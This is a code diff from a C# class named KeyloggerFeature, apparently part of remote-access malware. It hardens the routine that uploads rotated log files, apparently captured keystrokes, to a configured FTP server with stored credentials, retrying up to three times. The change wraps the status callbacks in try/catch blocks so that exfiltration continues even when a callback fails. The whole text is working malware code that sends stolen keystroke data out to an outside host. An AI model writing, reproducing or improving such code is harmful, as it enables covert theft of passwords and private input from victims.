@@ -273,23 +273,23 @@ internal static class KeyloggerFeature
             var cb = _ftpStatusCb;
             for (int attempt = 1; attempt <= 3; attempt++)
             {
-                if (cb != null) await cb("uploading", filename, "", attempt);
+                if (cb != null) try { await cb("uploading", filename, "", attempt); } catch { }
                 try
                 {
                     await FtpUploadAsync(rotated, _ftpHost!, _ftpPort, _ftpUser ?? "", _ftpPass ?? "", _ftpPath ?? "/");
-                    if (cb != null) await cb("uploaded", filename, "", attempt);
+                    if (cb != null) try { await cb("uploaded", filename, "", attempt); } catch { }
                     return;
                 }
                 catch (Exception ex)
                 {
                     if (attempt < 3)
                     {
-                        if (cb != null) await cb("retry", filename, ex.Message, attempt);
+                        if (cb != null) try { await cb("retry", filename, ex.Message, attempt); } catch { }
                         await Task.Delay(5000);
                     }
                     else
                     {
-                        if (cb != null) await cb("failed", filename, ex.Message, attempt);
+                        if (cb != null) try { await cb("failed", filename, ex.Message, attempt); } catch { }
                     }
                 }
             }
